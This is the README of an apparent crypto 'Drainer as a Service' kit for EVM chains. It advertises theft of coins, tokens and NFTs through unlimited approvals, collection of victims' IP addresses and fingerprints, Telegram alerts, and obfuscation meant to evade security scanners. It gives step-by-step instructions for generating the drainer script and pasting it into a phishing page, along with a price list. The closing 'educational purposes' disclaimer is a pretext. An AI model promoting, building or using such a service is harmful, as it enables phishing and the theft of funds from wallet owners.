# nexus-drain-panel
# Nexus Drain — EVM Drainer DaaS (Admin Panel)

**Fully working Drainer as a Service for Ethereum, BSC, Polygon, Arbitrum, Avalanche and all EVM chains.**

![Version](https://img.shields.io/badge/version-2.5-green)
![Platform](https://img.shields.io/badge/platform-EVM-blue)
![License](https://img.shields.io/badge/license-private-red)

## 🔥 Features

- **Native coin drain** (ETH, BNB, MATIC, AVAX, FTM, etc.)
- **Any ERC-20 / BEP-20 token** (USDT, USDC, WBTC, DAI, SHIB, PEPE, custom)
- **NFT drain** (optional, request in panel)
- **Auto‑approve** with `MAX_UINT256`
- **Victim metadata** (IP, fingerprint, user‑agent, screen)
- **Telegram real‑time alerts** (amount, victim address, IP)
- **Anti‑debug & code obfuscation** (bypasses security scanners)
- **Redirect** to any legit site after drain
- **White‑label ready**

## 📦 How to get your script

1. Open the **admin panel** → https://nexus-drain-dev.github.io/nexus-drain-panel/

2. Enter your **payout wallet** (EVM address)  
3. Enter your **Telegram bot token** and **chat ID** (notifications)  
4. Select target chain and optional extra tokens  
5. Click **“Generate script”**  
6. Copy the JavaScript code and paste it into your phishing page

## 📈 Pricing

| Plan        | Price      | Victims | NFT | White‑label |
|-------------|------------|---------|-----|--------------|
| **Starter** | 0.5 ETH    | 500/mo  | ❌  | ❌           |
| **PRO**     | 1.5 ETH    | Unlimited | ✅ | ✅          |
| **Enterprise** | Custom | Custom | ✅ | ✅ + source |

> **Free test** – generate and test on Sepolia testnet before payment.

## 🛠️ Tech stack

- Frontend panel: HTML/CSS/JS (GitHub Pages)
- Drainer script: pure JavaScript + ethers.js v5
- Backend (optional): PHP collector for statistics

## 📞 Support

- Telegram: [@nexus_support](https://t.me/nexus_support) (only through panel, no upfront payments)
- PGP key: available on request

## ⚠️ Disclaimer

This tool is provided **for educational purposes and affiliate use only**. You are responsible for complying with all applicable laws. The developer does not condone illegal activity.

---

**Last updated:** 2026-05-27  
**Version:** 2.5 – added anti‑debug and extra token support
